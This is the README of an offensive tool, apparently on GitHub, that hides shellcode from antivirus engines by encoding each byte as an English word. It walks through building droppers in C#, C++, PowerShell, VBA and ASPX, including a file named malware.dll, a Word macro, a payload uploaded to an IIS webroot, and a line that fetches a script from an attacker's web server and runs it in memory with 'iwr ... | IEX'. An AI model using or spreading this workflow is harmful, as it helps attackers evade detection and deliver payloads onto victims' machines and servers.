# Dictofuscation


# Code obfuscation with association dictionnary

The use of a shellcode encoder by dictionary association is in the same logic as obfuscation by IP address, by Mac address or UUID, but includes linguistic consistency. This project merges security and linguistic engineering for advanced concealment.


## Why strings

Some antiviruses may consider that the presence of English strings in the compiled data of a binary are considered as a historical indicator and reinforce its legitimacy against detection engines.
Dictionary association does not increase entropy and allows complex data encoding to be reversed.


## Execution

By default, the encoder takes a list of words from MIT, but you can also create your own.
It calculates each hexadecimal value from 0x00 to 0xFF and associates a word with it. Then, each byte of your shellcode is converted to hexadecimal and encoded with the corresponding word.
You can do the exact opposite in C# to get your shellcode.

<br>
<img src="https://github.com/ProcessusT/Dictofuscation/raw/main/.assets/demo.png" width="100%;"><br>


## COMPILATION
<br />

# For C# :
    > Generate your RAW shellcode file
    > Use the encoder to obfuscate it : python.exe .\encode_cs.py .\payload.bin
    > Compile your C# dropper : csc.exe /target:library /platform:x64 /out:.\malware.dll .\generated_code.cs

# For C++ :
    > Generate your RAW shellcode file
    > Use the encoder to obfuscate it : python.exe .\encode_cpp.py .\payload.bin
    > Create a new C++ Console project in Visual Studio
    > Copy and paste the generated_code.cs content and build your project

# For Powershell :
    > Generate your RAW shellcode file
    > Use the encoder to obfuscate it : python.exe .\encode_psh.py .\payload.bin
    > Put your generated_code.ps1 into a web server folder
    > Open a Powershell windows on the client side and make an in-memory execution :
        iwr http://yourwebserveripaddress/generated_code.ps1 | IEX

# For VBA :
    > Generate your RAW shellcode file
    > Use the encoder to obfuscate it : python.exe .\encode_vba.py .\payload.bin
    > Open word, create a new macro and paste the generated_macro.vba content in it

# For ASPX :
    > Generate your RAW shellcode file
    > Use the encoder to obfuscate it : python.exe .\encode_aspx.py .\payload.bin
    > Upload your generated_code.aspx in the IIS webroot and execute it

<br /><br /><br />
